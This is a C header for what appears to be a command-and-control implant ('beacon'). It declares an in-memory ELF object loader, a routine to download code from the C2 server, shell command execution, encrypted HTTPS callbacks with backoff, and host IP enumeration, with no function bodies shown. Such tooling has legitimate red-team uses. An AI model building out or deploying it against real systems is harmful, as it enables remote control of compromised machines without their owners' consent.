/*
 * beacon_common.h - Shared beacon infrastructure.
 *
 * This header declares the types, constants, and functions that
 * every beacon variant (v1, v2, v3) uses. By centralizing the
 * BOF loader, HTTP client, crypto, and output capture here, we
 * eliminate ~800 lines of duplication across the three beacons.
 *
 * Each beacon only implements its main loop and variant-specific
 * logic (pull-mode, mesh discovery, experimental features).
 */
#ifndef BEACON_COMMON_H
#define BEACON_COMMON_H

#define _GNU_SOURCE
#include <stddef.h>
#include <stdint.h>
#include <sys/types.h>
#include "config.h"

/* --- Output buffer ---
 * BOF output is captured into a dynamically-sized buffer. The
 * default is 64KB which handles most BOFs. If a BOF produces more
 * output, it is truncated with a marker appended. The operator
 * can increase this via config.json "bof.output_buffer_size". */
#define BSB_OUTPUT_BUFFER_DEFAULT  65536
#define BSB_OUTPUT_TRUNCATION_MARKER "\n[OUTPUT TRUNCATED - increase bof.output_buffer_size in config.json]\n"

/* --- HTTP response wrapper ---
 * https_request now returns a proper struct instead of the
 * broken full+8 pointer trick that leaked memory. */
typedef struct {
    char    *data;      /* response body (malloc'd, caller frees) */
    size_t   len;       /* body length in bytes */
    int      status;    /* HTTP status code (0 on error) */
} http_response_t;

/* --- Trampoline (for position-independent BOF relocations) --- */
typedef struct {
    void    *addr;
    size_t   size;
} Trampoline;

/* --- BOF function signature --- */
typedef void (*bof_func_t)(char*, int);

/* --- Symbol resolver table entry --- */
typedef struct {
    const char  *name;
    void       **ptr;
} SymbolResolver;

/* --- Trampoline cache entry --- */
typedef struct {
    void    *original;
    void    *trampoline;
} TrampolineCache;

/* --- Global state (defined in beacon_common.c) --- */
extern char    *g_beacon_output;
extern size_t   g_output_len;
extern size_t   g_output_capacity;

/* Function pointers exposed to BOFs */
extern void *g_printf_ptr;
extern void *g_strlen_ptr;
extern void *g_memcpy_ptr;
extern void *g_memset_ptr;
extern void *g_exit_ptr;
extern void *g_dlsym_ptr;
extern void *g_dlerror_ptr;
extern void *g_dlopen_ptr;
extern void *g_dlclose_ptr;
extern void *g_write_ptr;
extern void *g_mmap_ptr;
extern void *g_munmap_ptr;
extern void *g_BeaconPrintf_ptr;
extern void *g_BeaconOutput_ptr;
extern void *g_socket_ptr;
extern void *g_connect_ptr;
extern void *g_inet_addr_ptr;
extern void *g_htons_ptr;
extern void *g_send_ptr;
extern void *g_recv_ptr;
extern void *g_close_ptr;
extern void *g_getaddrinfo_ptr;
extern void *g_freeaddrinfo_ptr;

/* --- Core functions --- */

/* Initialize the output buffer. Call once at beacon startup.
 * Returns 0 on success, -1 on allocation failure. */
int bsb_output_init(size_t capacity);

/* Free the output buffer. Call at beacon shutdown. */
void bsb_output_cleanup(void);

/* Reset the output buffer for a new BOF execution. */
void bsb_output_reset(void);

/* Beacon API: printf-style output capture (called by BOFs). */
void BeaconPrintf(int type, const char *fmt, ...);

/* Beacon API: raw output capture (called by BOFs). */
void BeaconOutput(int type, const char *data, int len);

/* Trampoline management */
void *create_trampoline(void *target);
void  cleanup_trampolines(void);
void *get_or_create_trampoline(void *target);

/* HTTP client: performs GET or POST request. Returns a struct
 * with the response body, length, and status code. On error,
 * data is NULL and len is 0. The caller must free(data).
 * Uses config for timeouts, TLS verification, and user-agent. */
http_response_t https_request(const bsb_config_t *cfg,
                               const char *url,
                               const char *method,
                               const char *post_data);

/* Base64 encode/decode (OpenSSL BIO-based) */
char           *base64_encode(const unsigned char *input, int len);
unsigned char  *base64_decode(const char *input, int *len);

/* URL percent-encoding (RFC 3986 unreserved set) */
char *url_encode(const char *in, size_t in_len, size_t *out_len);

/* AES-256-CFB encrypt/decrypt (standalone, no OpenSSL dependency) */
unsigned char *aes256_cfb_encrypt(const unsigned char *key,
                                   const unsigned char *iv,
                                   const unsigned char *plaintext,
                                   size_t len, int *out_len);
unsigned char *aes256_cfb_decrypt(const unsigned char *key,
                                   const unsigned char *iv,
                                   const unsigned char *ciphertext,
                                   size_t len, int *out_len);

/* Execute a shell command and capture output. Returns malloc'd
 * buffer (caller frees). On error, returns NULL. */
char *exec_cmd(const char *cmd, int *out_len);

/* ELF BOF loader. Loads a position-independent ELF object into
 * memory, resolves symbols, applies relocations, and calls the
 * entry function in a forked child process for crash isolation.
 * Returns 0 on success, -1 on error. BOF output is captured
 * into g_beacon_output. */
int RunELF(const char *functionname,
           unsigned char *elf_data,
           uint32_t filesize,
           unsigned char *argumentdata,
           int argumentSize);

/* Download a BOF from the C2 server. Returns malloc'd buffer
 * (caller frees). On error, sets *out_size to 0 and returns NULL. */
unsigned char *download_bof(const bsb_config_t *cfg,
                             const char *url,
                             size_t *out_size);

/* Execute a BOF and capture its output. Returns malloc'd string
 * (caller frees). On error or empty output, returns strdup(""). */
char *run_bof_and_capture(unsigned char *elf_data,
                           uint32_t filesize,
                           char *args,
                           int arglen,
                           int *out_len);

/* Get local IP addresses as a comma-separated string. Returns
 * malloc'd buffer (caller frees). Falls back to "127.0.0.1". */
char *get_local_ips(void);

/* Exponential backoff state. Initialize once, call bsb_backoff_next()
 * to get the next sleep duration. Automatically resets on success. */
typedef struct {
    int current_seconds;
    int base_seconds;
    int max_seconds;
} bsb_backoff_t;

void bsb_backoff_init(bsb_backoff_t *bo, int base, int max);
int  bsb_backoff_next(bsb_backoff_t *bo);
void bsb_backoff_reset(bsb_backoff_t *bo);

#endif /* BEACON_COMMON_H */
